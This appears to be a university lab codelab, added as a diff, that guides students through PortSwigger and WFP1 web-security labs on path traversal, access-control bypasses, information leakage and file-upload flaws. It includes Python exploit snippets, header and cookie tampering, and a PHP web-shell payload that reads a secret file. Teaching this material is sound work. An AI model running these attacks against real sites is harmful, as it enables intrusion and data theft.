@@ -1,0 +1,360 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>2.1: Broken Access Control</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W2.1_broken_access_control" title="2.1: Broken Access Control" environment="web" feedback-link="https://docs.google.com/document/d/1fcgAGPnZ7fGWsmzkmCdx5LP16Rw7GukcNAWEfb1SdtM">
+<google-codelab-step label="file-path-traversal (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-path-traversal/lab-simple" target="_blank">simple</a></h2>
+<p>When a URL contains input that is used by the application to navigate the file system directly with, it can allow an adversary access to files that normally would not be available from the web application. In this level, one can see a URI <code>/image?filename=<name></name></code> that may be vulnerable to this attack. Use the file path traversal syntax in Unix to navigate to the top level directory (<code>../../../</code>) access the server&#39;s user account file (<code>/etc/passwd</code>) then print out the results.</p>
+<pre><code># &lt;FMI&gt; (Fill Me In) denotes a value you will need to modify
+url = f&#39;&#39;&#39;https://{site}/image?filename=&lt;FMI&gt;&#39;&#39;&#39;
+resp = s.get(url)
+print(resp.text)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass" target="_blank">absolute-path-bypass</a></h2>
+<p>This level is similar except that relative path traversals (e.g. <code>../</code>) are now filtered out, but that doesn&#39;t account for alternate methods of exploitation such as the use of an absolute path. Adapt the URL parameter to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively" target="_blank">sequences-stripped-non-recursively</a></h2>
+<p>Relative paths are again filtered out, but not recursively. When one filters out &#39;<code>../</code>&#39; from the following sequence &#39;<code>....//</code>&#39;, what is the result? Use this technique to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="file-path-traversal (2)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode" target="_blank">superfluous-url-decode</a></h2>
+<p>To send special characters in URLs, one typically URL-encodes the characters first. Thus, when typing a URL that has spaced in the filename such as &#39;<a href="http://foo/index" target="_blank">http://foo/index backup.html</a>&#39;, the browser will URL-encode to <a href="http://foo/index%20backup.html" target="_blank">http://foo/index%20backup.html</a>. On the server-side, a URL-decode operation is then performed to generate the original path with the special character in it. There can be some confusion as to whose responsibility it is on the server to do the decoding. Is it handled by the web framework automatically or does the web application have to do the decode before consuming the content? When filtering out special characters that are used for file traversal, this is important. If done multiple times, this can inject a vulnerability and allow the path traversal to happen. In Python, one can test out URL decoding via the <code>urllib</code> package that is built-in (via <code>urllib.parse.unquote</code>). To test this out, perform the following in a Python interpreter.</p>
+<pre><code>from urllib.parse import unquote
+filename = &#39;&#39;&#39;..%252f..%252f..%252f&#39;&#39;&#39;
+unquote(filename)
+unquote(unquote(filename))</code></pre>
+<p>Use the superfluous decode to again access <code>/etc/passwd</code>.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path" target="_blank">validate-start-of-path</a></h2>
+<p>One way to limit traversal attacks is to force a filename given to start with a particular pattern such as &#39;<code>/var/www/images</code>&#39;. Unfortunately, this is easily bypassed using path traversal attacks seen previously.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass" target="_blank">validate-file-extension-null-byte-bypass</a></h2>
+<p>One way to limit traversal attacks is to append an expected file extension to all content retrieved. Unfortunately, special characters such as the string termination character (e.g. a NULL) can be inserted into the URL via the URL-encoding mechanism described previously (<code>%00</code>). </p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (1)" duration="10">
+<p>In this set of labs, you will attempt to elevate your privileges and access functionality reserved for administrator accounts. Using this access, you will then perform protected actions such as the deletion of <code>carlos</code>&#39;s user account or the retrieval of his API key. To start with, we explore vertical access control issues where a user is able to elevate his/her access to functionality reserved for administrators of the site.</p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality" target="_blank">unprotected-admin-functionality</a></h2>
+<p>In this level, you first perform reconnaissance on the site by examining its <code>robots.txt</code> file. From this file a URI to a protected administrator panel is revealed. You can directly access this URI to delete the user <code>carlos</code>. The simplicity of this level allows us the opportunity to utilize additional features in Python. To begin with, the snippet below grabs the <code>robots.txt</code> file and uses a list comprehension to return all of the lines that contain the string <code>'admin'</code> in it. The script then takes the first line, splits it using the space character, and then pulls out the second argument as the URI for the administrator panel.</p>
+<pre><code>url = f&#39;https://{site}/robots.txt&#39;
+resp = s.get(url)
+match_line = [line for line in resp.text.split(&#39;\n&#39;) if &#39;admin&#39; in line]
+uri = match_line[0].split(&#39; &#39;)[1]</code></pre>
+<p>Once we&#39;ve obtained the URI of the administrator panel, we can then retrieve it from the site. The page we retrieve has a set of links that includes one for deleting carlos. In our script, we can use <code>BeautifulSoup</code> to parse the page, find all &lt;<code>a</code>&gt; tags that contain the word <code>'carlos'</code> in them, then pull the <code>href</code> from the tag to obtain the URI that will delete <code>carlos</code>. The script uses list comprehensions applied to the list of tags BeautifulSoup returns along with a predicate to filter out only those tags that contain the desired user. Finally, the script retrieves the URL to delete <code>carlos</code> and solve the level.</p>
+<pre><code>url = f&#39;https://{site}{uri}&#39;
+resp = s.get(url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+
+carlos_delete_link = [link for link in soup.find_all(&#39;a&#39;) if &#39;carlos&#39; in link.get(&#39;href&#39;)]
+
+delete_uri = carlos_delete_link[0][&#39;href&#39;]
+s.get(f&#39;https://{site}{delete_uri}&#39;)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url" target="_blank">unprotected-admin-functionality-with-unpredictable-url</a></h2>
+<p>In this level, the administrator panel uses security by obscurity to hide itself. Unfortunately, viewing the landing page&#39;s source reveals its URI. This snippet finds the URI by getting all of the scripts on the page, pulling out the contents of the second one, and then finding the line in the script containing the hidden URI. Code from the prior Python script can then be used to delete <code>carlos</code>.</p>
+<pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+script = soup.find_all(&#39;script&#39;)[1].contents[0]
+match_line = [line for line in script.split(&#39;\n&#39;) if &#39;admin-&#39; in line]
+uri = match_line[0].split(&#34;&#39;&#34;)[3]</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (2)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter" target="_blank">user-role-controlled-by-request-parameter</a></h2>
+<p>Putting trust in any input that is supplied by a client, creates opportunities for exploitation. Without proper input validation on the backend, a client can use malicious input to access sensitive resources. In this level, the site is protected by a username and password. However, once a user logs in and navigates the site, it becomes apparent that particular parameters are being passed to the server from the client that might control access to the site. First start, by accessing the main page and visiting the Login page. Bring up the Developer Tools on the page and then use the given initial credentials <code>wiener:peter</code> to log in.<br><br>When logged in, visit the &#34;Application&#34; tab in the Developer Tools and then on the left, click on &#34;Cookies&#34; to examine what cookies are issued by the site for the browser to store. Find the cookie setting that might give you elevated access if you tamper with it appropriately.</p>
+<p class="image-container"><img style="width:624px" src="img/505270c73f0de173.png"></p>
+<p>We&#39;ll now construct the Python code for automatically solving this level. Note that fields with &lt;<code>FMI</code>&gt; denote values you must fill in. The code starts by logging into the site as we have done in prior levels using a Python requests session object that accumulates cookies.</p>
+<pre><code>import requests
+from bs4 import BeautifulSoup
+
+s = requests.Session()
+site = &#39;&lt;FMI&gt;&#39;
+login_url = f&#39;https://{site}/login&#39;
+resp = s.get(login_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+logindata = {
+    &#39;csrf&#39; : csrf,
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;password&#39; : &#39;peter&#39;
+}
+resp = s.post(login_url, data=logindata)</code></pre>
+<p>To tamper with a session&#39;s cookies, the code below creates one that follows the format discovered previously. Fill in the &lt;<code>FMI</code>&gt; fields to create a cookie that gives our session elevated privileges. The code then adds the cookie to the session.</p>
+<pre><code>cookie_obj = requests.cookies.create_cookie(domain=site, name=&#39;&lt;FMI&gt;&#39;,value=&#39;&lt;FMI&gt;&#39;)
+s.cookies.set_cookie(cookie_obj)</code></pre>
+<p>Finally, we are given the <code>/admin</code> path as the location of the administrator panel that can be used to delete the user <code>carlos</code>. Use the code for doing so from previous levels.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (3)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile" target="_blank">user-role-can-be-modified-in-user-profile</a></h2>
+<p>Visit the &#34;Account login&#34; page and inspect the form. Note that unlike the forms protected by the <code>csrf</code> token, the form only has two input fields: <code>username</code> and <code>password</code>.</p>
+<pre><code>&lt;form class=login-form method=POST action=/login&gt;
+    &lt;label&gt;Username&lt;/label&gt;
+        &lt;input required type=username name=&#34;username&#34;&gt;
+    &lt;label&gt;Password&lt;/label&gt;
+         &lt;input required type=password name=&#34;password&#34;&gt;
+    &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+ &lt;/form&gt;</code></pre>
+<p>After logging in, visit &#34;My Account&#34; and view the button for updating your e-mail address and deleting your account.</p>
+<p class="image-container"><img style="width:624px" src="img/d70fc78822aef7e8.png"></p>
+<p>Clicking on &#34;Update email&#34; invokes the <code>jsonSubmit()</code> function. With the developer console up, enter in your e-mail address and click the button. Note that the form submission causes a redirect to another web page, wiping out the initial submit request. Go back to &#34;My Account&#34; and enter in your e-mail address again. Before clicking on the button, go to the developer console and click on &#34;Console&#34;. Enter in the following Javascript code that will send control to the debugger before the page unloads so you can view the submission before the redirection.</p>
+<pre><code>window.addEventListener(&#34;beforeunload&#34;, function() { debugger; }, false)</code></pre>
+<p>Then click on the &#34;Network&#34; tab in the developer console before clicking on &#34;Update email&#34;. Find the form submission request and view its format. As the console shows, the form submission is done via a JSON-encoded object versus prior levels that used the original <code>www-form-urlencoded</code> format.</p>
+<p class="image-container"><img style="width:624px" src="img/b17c7d6e6d2ef26f.png"></p>
+<p>With Python requests, we can perform POST requests using the JSON format via a different keyword argument. By supplying a dictionary to the keyword argument <code>json</code>, the package will format the dictionary as a JSON object to be sent to the server as above. The code below logs into the site with the given credentials, then submits the form requests to change the account&#39;s e-mail address via JSON. To avoid following the redirection, the <code>allow_redirects</code> keyword is set to false so we can obtain the intermediate response before being sent back to the main page. Run the script on your site and view the response.</p>
+<pre><code>s = requests.Session()
+login_url = f&#39;https://{site}/login&#39;
+login_data = { &#39;password&#39; : &#39;peter&#39;, &#39;username&#39; : &#39;wiener&#39;}
+resp = s.post(login_url, data=login_data)
+
+change_url = f&#39;https://{site}/my-account/change-email&#39;
+json_data = {&#39;email&#39; : &#39;OdinID@pdx.edu&#39;}
+resp = s.post(change_url,json=json_data, allow_redirects = False)
+print(resp.status_code)
+print(resp.text)</code></pre>
+<p>The form submission results in an HTTP redirect with status code 302, but it also sends back a JSON object in its response body with the role that has been assigned to the user. Ideally, this role can never be modified directly by the client. However, if the server blindly incorporates the JSON object given by the client into its backend data structure, a client setting the role in the change-email request can elevate privileges. To try this out, as the level description indicates, specify your role to be &#34;2&#34; to see if you can trick the backend into giving you administrator privileges.</p>
+<pre><code>json_data = {&#39;email&#39; : &#39;OdinID@pdx.edu&#39;, &#39;???&#39; : 2}
+resp = s.post(change_url,json=json_data, allow_redirects = False)
+print(resp.text)</code></pre>
+<p>If successful, you can then use the prior code for deleting the <code>carlos</code> account to complete the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (4)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented" target="_blank">url-based-access-control-can-be-circumvented</a></h2>
+<p>Content distribution networks (CDNs), web application firewalls (WAFs), web proxies, web caches, and load balancers will accept HTTP requests and forward them on towards their ultimate destinations. Oftentimes, they will rewrite the URLs being requested in the process. To preserve the original request, they might include an HTTP header that indicates the original request. For example, an experimental header such as <code>X-Original-URL:</code> might specify what the original request might have been for.</p>
+<p>Problems arise when an application uses the URL to limit access. In this level, what happens when one attempts to access <code>/admin</code>?</p>
+<pre><code>url = f&#39;https://{site}/admin&#39;
+resp = s.get(url)
+print(resp.text)</code></pre>
+<p>Filtering done on the front-end appears to block the request. Now try a request that has the <code>X-Original-URL:</code> header set to the path.</p>
+<pre><code>url = f&#39;https://{site}/&#39;
+resp = s.get(url, headers = {&#39;X-Original-URL&#39; : &#39;/admin&#39;})
+print(resp.text)</code></pre>
+<p>We can slip by the filter using this header. Note that when sending parameters in this case, we must attach them to the original URL rather than the path specified by the <code>X-Original-URL:</code> header.</p>
+<pre><code>url = f&#39;https://{site}/?username=carlos&#39;
+resp = s.get(url, headers = {&#39;X-Original-URL&#39; : &#39;???&#39;})
+print(resp.text)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented" target="_blank">method-based-access-control-can-be-circumvented</a></h2>
+<p>In this level, access control prevents a logged in user from submitting a form that is used by admin users to upgrade users to administrators. While preventing the form submission via HTTP POST iis implemented, HTTP forms can be submitted via GET requests as well. Login using the <code>administrator:admin</code> credentials and navigate to the administrator panel at <code>/admin</code>. Upgrade a user to administrator and view the submission in the developer console of the browser to see the URL the form is posted to and the data that is posted. Downgrade the user and then log back out.</p>
+<p>Log out and log in as the regular user with credentials <code>wiener:peter</code>. Attempt to visit the administrator panel directly by appending <code>/admin</code> manually. While this has been restricted, perhaps the upgrade URL has not. Use the prior Python code to log in as the user, then attempt the upgrade and see what the result is.</p>
+<pre><code>upgrade_data = {
+    &#39;???&#39; : &#39;upgrade&#39;,
+    &#39;???&#39; : &#39;wiener&#39;
+}
+url = f&#39;https://{site}/admin-roles&#39;
+resp = s.post(url, data = upgrade_data)
+print(resp.status_code)
+print(resp.text)</code></pre>
+<p>While the POST submission of the form may be protected since that&#39;s what is encoded on the page, the form can also be submitted via GET. See if the application restricts it by repeating the request via GET as described <a href="https://www.w3schools.com/tags/ref_httpmethods.asp" target="_blank">here</a>. </p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (5)" duration="10">
+<p>In the next set of labs, we explore horizontal access control issues where functionality between valid user accounts is not protected properly.</p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter" target="_blank">user-id-controlled-by-request-parameter</a></h2>
+<p>Log in with the given credentials and click on &#34;My account&#34; to view your API key. View the URL that this corresponds to and observe that the user ID is encoded in the URL. it should not be possible for one to change the value manually and view another User ID&#39;s information. Since the goal is to get the API key of <code>carlos</code>, see if changing the user ID allows you to.<br><br>This level is quite trivial which makes it a good opportunity to practice with Python and BeautifulSoup. After using the prior Python code to login to the site, the script can then access the profile page of <code>carlos</code>. On the page, is a &lt;<code>div</code>&gt; element that contains the string &#34;<code>Your API Key is: ...</code>&#34;. The Python code below uses BeautifulSoup to find the &lt;<code>div</code>&gt; element containing the string API, then splits the text to pull out the value of the API key.</p>
+<pre><code>resp = s.get(url_to_retrieve_carlos_profile)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+div_text = soup.find(&#39;div&#39;, text=re.compile(&#39;API&#39;)).text
+api_key = div_text.split(&#39; &#39;)[4]</code></pre>
+<p>Finally, the level is solved upon submission of the API key to the &#34;Submit solution&#34; site.</p>
+<pre><code>url = f&#39;https://{site}/submitSolution&#39;
+resp = s.post(url,data={&#39;answer&#39;:api_key})</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids" target="_blank">user-id-controlled-by-request-parameter-with-unpredictable-user-ids</a></h2>
+<p>This level is similar to the previous level, but requires you to navigate the site to find content posted by <code>carlos</code> that might reveal his randomly generated user ID. Given a blog post authored by <code>carlos</code>, a link that has as its text <code>'carlos'</code> can be extracted and parsed to reveal this user ID using the Python code below.</p>
+<pre><code>carlos_userid = soup.find(&#39;a&#39;,text=&#39;carlos&#39;)[&#39;href&#39;].split(&#39;=&#39;)[1]</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (6)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect" target="_blank">u</a><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect" target="_blank">ser-id-controlled-by-request-parameter-with-data-leakage-in-redirect</a></h2>
+<p>Execute-After-Redirect vulnerabilities occur when a web application does not immediately terminate a script after it has decided to redirect the request to another destination. As a result, leakage of information from the continued execution of the script. For example, consider this PHP script from this <a href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-alhuzali.pdf" target="_blank">paper</a> that checks to see if a username is associated with a session and redirects users to the main landing page, if not. After setting the <code>Location:</code> header to redirect the request, the script should exit, rather than continue.</p>
+<p class="image-container"><img style="width:624px" src="img/6b761b1150c2fb1e.png"></p>
+<p>A fixed version is below:</p>
+<p class="image-container"><img style="width:454px" src="img/53d2613e00b3d224.png"></p>
+<p>Log into the site with the given credentials <code>wiener:peter</code>. Click on &#34;My account&#34; and see that your username shows up in the URL. Bring the developer console up, change the username to <code>carlos</code> in the URL, then retrieve the page. The browser automatically redirects itself to the home page. There are many ways to capture the response before redirection. As we have seen earlier, Python requests has an <code>allow_redirects</code> keyword argument we can set. Use this to get the API key of <code>carlos</code> and solve the level.</p>
+<pre><code>resp = s.get(carlos_account_url, allow_redirects=False)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure" target="_blank">user-id-controlled-by-request-parameter-with-password-disclosure</a></h2>
+<p>In this level, password leakage occurs when the site pre-fills form fields inappropriately. By using horizontal escalation to access the administrator&#39;s page as the given user, a leaked password can then be used to log in as the administrator to delete the user <code>carlos</code>.</p>
+<pre><code>admin_password = soup.find(&#39;input&#39;,{&#39;name&#39;:&#39;password&#39;}).get(&#39;value&#39;)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references" target="_blank">insecure-direct-object-references</a></h2>
+<p>In this level, functionality to download transcripts of a chat does so using predictable file names. Examine this functionality to find a way to download an earlier transcript that reveals the password of <code>carlos</code>. Use it to login.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="access-control (7)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step" target="_blank">multi-step-process-with-no-access-control-on-one-step</a></h2>
+<p>Log in using the administrator:admin credentials and visit the admin console (<code>/admin</code>). Bring up the developer console and upgrade <code>carlos</code> to an administrator. View the form data submitted to &#39;<code>/admin-roles</code>&#39; in the POST. The page redirects to a confirmation page. Confirm the upgrade and see the form data that is submitted in the POST. What has changed?<br><br>Log out and log back in using the <code>wiener:peter</code> credentials. Attempt to access both <code>/admin</code> and <code>/admin-roles</code> via the browser (e.g. via GET requests) Both are protected. Using a Python script, see if the POST that confirms the upgrade is similarly protected.</p>
+<pre><code>adminrole_url = f&#39;https://{site}/admin-roles&#39;
+
+upgrade_data = {
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;???&#39; : &#39;upgrade&#39;,
+    &#39;???&#39; : &#39;true&#39;
+}
+
+resp = s.post(adminrole_url,data=upgrade_data)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/access-control/lab-referer-based-access-control" target="_blank">referer-based-access-control</a></h2>
+<p>Log in using the administrator:admin credentials and visit the admin console (<code>/admin</code>). Bring up the developer console and upgrade <code>carlos</code> to an administrator. Is the form submission done as a GET or a POST? Copy the request and then downgrade <code>carlos</code> back to a normal user.</p>
+<p>Log out and log back in using the <code>wiener:peter</code> credentials. Attempt to access both <code>/admin</code> and the request copied earlier to see if either request succeeds. In this level, the server uses the <code>Referer:</code> HTTP request header to check the URL of the page that originated the request. In normal operation, the request would come from the &#39;<code>/admin</code>&#39; page and the only user who can access that route is the administrator. All requests that do not originate from this page are simply denied. Unfortunately, the client controls the <code>Referer:</code> header and can change it to bypass this check. For example, via Python requests, one can do:</p>
+<pre><code>resp = s.get(admin_upgrade_url,headers={&#39;referer&#39; : admin_url})</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="information-disclosure" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages" target="_blank">lab-infoleak-in-error-messages</a></h2>
+<p>This web application fails to sanitize its error messages. As a result, triggering an error causes an information leak that an adversary can leverage. To demonstrate this, examine the site and the products it contains. Then, trigger the leak by giving the site a <code>productId</code> that does not exist to reveal the version number that you.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page" target="_blank">lab-infoleak-on-debug-page</a></h2>
+<p>Web Frameworks often pass secrets such as API keys environment variables. In addition, they may also support debug pages that are meant for use in the development process. These pages would include the environment variables the web application depends upon. If such debug pages aren&#39;t appropriately protected, secret information can be exposed. In this level, the main landing page reveals a debug route to the PHP runtime that implements the site. View the HTML of the page to find it. Then, visit the disclosed URI to reveal the environment variables in order to expose the <code>SECRET_KEY</code> that can be used to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files" target="_blank">lab-infoleak-via-backup-files</a></h2>
+<p>Backup files left in a production environment can be a source of information leaks. In this level, the robots exclusion standard file reveals a directory that contains a backup of a program file. Within it is a password for a backend database. Find it and use it to solve the level</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="WFP1: File upload" duration="15">
+<p>One of the most dangerous things a site can do is allow file uploads. An adversary can attempt to upload a malicious file, perhaps one that can even execute code, then visit it subsequently in order to execute the embedded code. To show this vulnerability, bring up the WFP1 VM and visit the landing page.</p>
+<h2 is-upgraded>Example #1</h2>
+<p>The site allows you to choose a file from your file system and upload it. It then provides you a link to access the file uploaded.</p>
+<p class="image-container"><img style="width:274px" src="img/3d2af7499f8a98b.png"></p>
+<p>From the URL of the exercise, the programming language that is being used appears to be PHP. What if we can upload a file in this programming language and then access it by clicking on its upload link? Upload a <a href="https://www.php.net/manual/en/function.system.php" target="_blank">script</a> that outputs a directory listing via &#39;<code>ls</code>&#39; when clicked.</p>
+<ul>
+<li><strong>Take a screenshot of the result for your lab notebook</strong></li>
+</ul>
+<h2 is-upgraded>Example #2</h2>
+<p>Try uploading the same file used in the previous exercise.</p>
+<ul>
+<li><strong>Take a screenshot of the result for your lab notebook</strong></li>
+</ul>
+<p>The site seems to be doing some filtering to detect whether or not someone is attempting to upload a script. One of the problems with filters is that they can be incomplete and fail to catch all malicious content. Create a file that lists the current working directory of the web server via <code>'pwd'</code>. Then, test 3 different file extensions <a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">used for PHP scripts</a> to see which ones have been filtered properly. Discover the extension that bypasses the filter and use it to upload a file that performs the directory listing.</p>
+<ul>
+<li><strong>Take a screenshot of the result for your lab notebook</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="file-upload (1)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload" target="_blank">lab-file-upload-remote-code-execution-via-web-shell-upload</a> </h2>
+<p>In this lab, logged in users are able to upload an avatar to their account profile. Unfortunately, the web application does not validate the file type or file content of the upload, allowing an adversary to upload a malicious script that can exfiltrate data or execute code. In this level, the goal is to access a secret in <code>/home/carlos/secret</code> and then submit it to the solution server of the site.</p>
+<p>We can construct our exploit in Python by first using the login script used in previous levels to parse the CSRF token in the login form and then to login with the given credentials. This redirects us to the <code>/my-account</code> profile page where one of the forms allows the user to upload an avatar. File uploads are done as multipart form data requests to an upload URL specified in the action attribute. Inspect the form and answer the following question:</p>
+<ul>
+<li><strong>What are the names of the form fields that are of type </strong><strong><code>hidden</code></strong><strong>?</strong></li>
+</ul>
+<p>When specifying the file upload, there are two parts: the name of the file on the upload server you want to create and the content that you want to have in the file. This is specified as a tuple. The script below uploads the string &#39;<code>Hello world!</code>&#39; as an avatar, specifying the name of the file to create on the server as &#34;<code>hello.txt</code>&#34; via the multi-part form. </p>
+<pre><code>upload_url = f&#39;https://{site}/my-account/avatar&#39;
+multipart_form_data = {
+    &#39;csrf&#39; : (None, csrf),
+    &#39;user&#39; : (None, &#39;wiener&#39;),
+    &#39;avatar&#39; : (&#39;hello.txt&#39;, &#39;Hello world!&#39;)
+}
+resp = s.post(upload_url, files=multipart_form_data)</code></pre>
+<p>Run the snippet, bring up a web browser, and open the avatar image link in a new tab. Verify that the message appears.</p>
+<ul>
+<li><strong>Take a screenshot of the message and the URL the avatar is stored at on the server</strong></li>
+</ul>
+<p>We can now upload a malicious PHP script (<code>secret.php</code>) to dump the file contents of the file we&#39;re interested in. By accessing the URL where the script is stored, we may then be able to have PHP execute the script and return the file&#39;s contents. The snippet below does so by specifying a PHP script that uses PHP&#39;s <code>file_get_contents()</code> function to access the secret file and echo out its contents. It then accesses the script in order to execute its payload.</p>
+<pre><code>upload_url = f&#39;https://{site}/my-account/avatar&#39;
+multipart_form_data = {
+    &#39;csrf&#39; : (None, csrf),
+    &#39;user&#39; : (None, &#39;wiener&#39;),
+    &#39;avatar&#39; : (&#39;secret.php&#39;, &#34;&lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&gt;&#34;)
+}
+resp = s.post(upload_url, files=multipart_form_data)
+
+secret_url = f&#39;https://{site}/files/avatars/secret.php&#39;
+resp = s.get(secret_url)
+secret = resp.text</code></pre>
+<p>The result of the script&#39;s execution is the secret stored in <code>/home/carlos/secret</code> that we can then simply submit to the solution site to finish the level.</p>
+<pre><code>solution_url = f&#39;https://{site}/submitSolution&#39;
+solution_data = {
+    &#39;answer&#39; : secret
+}
+s.post(solution_url, data=solution_data)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="file-upload (2)" duration="3">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank">lab-file-upload-web-shell-upload-via-content-type-restriction-bypass</a></h2>
+<p>The developer of the site has fixed the prior vulnerability by disallowing all content-types except <code>image/png</code> and <code>image/jpeg</code> for avatar uploads. Begin by using the prior solution script to upload the PHP script. Print out the response returned after uploading the avatar as shown below:</p>
+<pre><code># Upload malicious avatar
+resp = s.post(upload_url, files=multipart_form_data)
+print(resp.text)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing the results</strong></li>
+</ul>
